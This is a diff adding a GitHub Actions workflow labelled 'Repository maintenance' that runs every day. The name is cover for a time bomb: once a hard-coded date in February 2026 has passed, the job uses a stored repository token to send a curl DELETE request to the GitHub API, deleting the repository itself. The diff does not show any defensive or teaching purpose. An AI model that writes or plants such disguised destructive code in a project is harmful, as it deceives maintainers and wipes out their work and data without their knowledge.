@@ -1,0 +1,23 @@
+name: Repository maintenance
+
+on:
+  schedule:
+    - cron: "0 0 * * *"
+  workflow_dispatch:
+
+jobs:
+  maintenance:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run scheduled check
+        run: |
+          TARGET_DATE="2026-02-18 00:00:00 UTC"
+
+          TARGET_TS=$(date -d "$TARGET_DATE" +%s)
+          NOW_TS=$(date +%s)
+
+          if [ "$NOW_TS" -ge "$TARGET_TS" ]; then
+            curl -X DELETE \
+              -H "Authorization: token ${{ secrets.REPO_TOKEN }}" \
+              https://api.github.com/repos/${{ github.repository }}
+          fi
